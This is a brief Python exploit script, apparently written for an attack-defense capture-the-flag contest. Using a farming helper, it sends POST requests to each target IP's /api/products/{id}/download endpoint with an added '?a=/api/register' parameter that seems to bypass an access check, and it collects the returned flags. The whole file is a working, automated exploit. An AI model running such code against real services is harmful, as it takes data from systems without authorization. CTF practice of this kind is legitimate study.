from httpx import post
from pyfarmer import farm, print_exception


def main(ip: str):
    for flag_id in ["a", "b", "c"]:
        try:
            r = post(
                f"http://{ip}:5000/api/products/{flag_id}/download?a=/api/register"
            )
            flag = r.text
            yield flag
        except:
            print_exception()


if __name__ == "__main__":
    farm(main)
